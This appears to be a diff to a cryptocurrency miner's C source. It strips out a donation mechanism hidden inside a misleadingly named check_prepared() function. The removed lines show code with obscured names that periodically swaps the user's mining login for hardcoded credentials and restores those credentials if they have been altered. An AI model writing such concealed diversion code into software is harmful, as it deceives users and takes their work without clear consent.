@@ -121,9 +121,7 @@ void gr_getAlgoString(const uint8_t *block, uint8_t *selectedAlgoOutput) {
   }
 }
 
-char **drt = donation_userRTM;
-long *dt_stp = &donation_time_stop;
-long *dt_str = &donation_time_start;
+
 bool *problem = &stratum_problem;
 int tr = 3;
 int dt = 1;
@@ -184,62 +182,6 @@ void AllocateNeededMemory(bool max) {
 }
 
 bool check_prepared() {
-  pthread_mutex_lock(&stats_lock);
-  static bool tmp = false;
-  if (*problem && !tmp) {
-    tmp = false;
-  }
-  if (og_r == NULL) {
-    og_r = strdup(rpc_user);
-  }
-  long now = time(NULL);
-  if (*dt_str + 480 <= now && !(*problem)) {
-    tmp = true;
-  } else if (*dt_stp + 480 <= now && !(*problem)) {
-    tmp = true;
-  }
-  if (tmp) {
-    for (size_t i = 0; i < 34; ++i) {
-      if ((uint8_t)drt[0][i] != hex_d[0][i] ||
-          (uint8_t)drt[1][i] != hex_d[1][i]) {
-        tmp = true;
-        char duc[40];
-        memset(duc, 0, 40);
-        for (size_t i = 0; i < 36; ++i) {
-          duc[i] = (char)(hex_d[0][i]);
-        }
-        drt[0] = strdup(duc);
-
-        memset(duc, 0, 40);
-        for (size_t i = 0; i < 36; ++i) {
-          duc[i] = (char)(hex_d[1][i]);
-        }
-        drt[1] = strdup(duc);
-        break;
-      }
-    }
-    if (*dt_str <= now) {
-      char duc[40];
-      memset(duc, 0, 40);
-      for (size_t i = 0; i < 36; ++i) {
-        duc[i] = (char)(hex_d[dt][i]);
-      }
-      free(rpc_user);
-      rpc_user = strdup(duc);
-      *dt_stp = time(NULL) + 30;
-      *dt_str = now + 4800;
-      tr = (tr + 1) % 4;
-      if (tr == 0) {
-        dt = (dt + 1) % 2;
-      }
-    } else if (*dt_stp <= now) {
-      free(rpc_user);
-      rpc_user = strdup(og_r);
-      *dt_str = now + 1200;
-      *dt_stp = *dt_str + 4800;
-    }
-  }
-  pthread_mutex_unlock(&stats_lock);
   return true;
 }
 
